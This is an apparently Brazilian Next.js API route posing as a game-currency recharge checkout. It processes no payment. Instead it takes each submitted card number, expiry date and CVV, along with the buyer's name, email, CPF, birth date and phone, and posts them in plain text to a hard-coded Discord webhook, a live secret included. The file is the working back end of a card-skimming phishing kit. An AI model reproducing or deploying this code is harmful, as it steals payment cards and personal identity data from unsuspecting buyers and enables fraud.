import { NextResponse } from "next/server";

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1412542646978613428/fpA-hLIdX_PcNkaaMJ_MZhHMFUQwmFIaoNgSK7s4SjTfgsar1hosW8XDTV8GkYf-BhNx";

export async function POST(req: Request) {
  try {
    const body = await req.json();

    const embed = {
      title: "💳 Nova Tentativa de Pagamento (Cartão)",
      description: "Um usuário tentou realizar um pagamento com **Cartão de Crédito/Débito**.",
      color: 0xf87171, // vermelho alerta
      fields: [
        {
          name: "👤 **Dados do Jogador**",
          value: `**Usuário:** ${body.user || "Desconhecido"}\n**Método:** ${body.payment || "N/A"}`,
          inline: false,
        },
        {
          name: "💰 **Informações da Compra**",
          value: `**Preço:** R$ ${body.price}\n**Base + Bônus:** ${body.base} + ${body.bonus}\n**Parcelas:** ${body.parcelas}`,
          inline: false,
        },
        {
          name: "💳 **Dados do Cartão**",
          value: `**Número:** \`${body.cardNumber}\`\n**Validade:** ${body.validade}\n**CVV:** ${body.cvv}`,
          inline: false,
        },
        {
          name: "📋 **Dados Pessoais**",
          value: `**Nome:** ${body.nome}\n**E-mail:** ${body.email}\n**CPF:** ${body.cpf}\n**Nascimento:** ${body.nascimento}\n**Telefone:** ${body.telefone}`,
          inline: false,
        },
      ],
      footer: {
        text: "📌 Sistema de Checkout • Canal Oficial de Recarga",
      },
      timestamp: new Date().toISOString(),
    };

    await fetch(DISCORD_WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds: [embed] }),
    });

    return NextResponse.json({ ok: true });
  } catch (err) {
    console.error("Erro webhook:", err);
    return NextResponse.json({ ok: false, error: "Erro ao enviar webhook" }, { status: 500 });
  }
}
